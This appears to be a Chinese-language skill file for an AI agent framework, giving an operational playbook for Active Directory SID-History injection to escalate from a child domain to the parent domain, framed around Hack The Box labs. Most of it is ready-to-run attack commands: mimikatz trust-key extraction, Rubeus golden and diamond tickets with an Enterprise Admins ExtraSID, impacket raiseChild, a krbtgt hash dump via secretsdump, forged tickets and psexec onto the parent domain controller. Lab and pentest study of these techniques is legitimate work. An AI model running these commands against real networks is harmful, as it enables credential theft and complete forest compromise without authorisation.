---
name: 'sid-history-injection'
description: 'SID-History Injection：子域→父域提权。Golden Ticket + ExtraSID / raiseChild.py / ticketer.py跨域。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## SID-History Injection — 子域→父域/跨林提权

### 原理
SID-History 是 AD 迁移机制，允许用户保留原域的 SID。攻击者可以注入高权限 SID（如 Enterprise Admins SID-519）到当前域用户的 Kerberos 票据中 → 跨信任边界访问父域/外部域资源。

### 检测域信任
```bash
nltest /domain_trusts /all_trusts /v
Get-DomainTrust  # PowerView
```
关键信号：`TrustAttributes: WITHIN_FOREST` + `TrustDirection: Bidirectional`

### 提取 Trust Key
```cmd
mimikatz.exe "lsadump::trust /patch" "exit"
# → [  In ]  DOMAIN$ -> PARENT_DOMAIN$  aes256_hmac: <KEY>
```

### 攻击路径

#### 路径 A: Golden Ticket + ExtraSID (Rubeus)
```cmd
Rubeus.exe golden /aes256:<TRUST_KEY> /user:Administrator /id:500 /domain:child.domain /sid:<CHILD_SID> /sids:<PARENT_EA_SID> /ptt
# /sids: S-1-5-21-<PARENT>-519  (Enterprise Admins)
```

#### 路径 B: Diamond Ticket + SIDHistory (更隐蔽)
```cmd
Rubeus.exe diamond /tgtdeleg /krbkey:<AES256> /sids:<EA_SID> /ptt
```

#### 路径 C: raiseChild.py (impacket, 最便捷)
```bash
# 需要子域 DA 权限
impacket-raiseChild child.domain/Admin@DC.child.domain
# 自动完成: 提取 trust key → Golden Ticket → DCSync 父域 → 输出 EA hash
```

#### 路径 D: ticketer.py + ExtraSID (手动)
```bash
# 1. 获取子域 krbtgt hash
impacket-secretsdump child/Admin@DC.child.domain -just-dc-user krbtgt

# 2. 创建跨域 Golden Ticket
impacket-ticketer -nthash <KRBTGT> -domain-sid <CHILD_SID> -domain child.domain -extra-sid <PARENT_EA_SID> Administrator

# 3. 使用 Ticket 访问父域
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass parent.domain/Administrator@DC.parent.domain
```

### HTB 场景
- 多域/多森林靶机 → 子域 DA → per2k/其他方式拿到子域 System → trust key → EA
- 信号：`nltest /domain_trusts` 返回多个域，`WITHIN_FOREST`
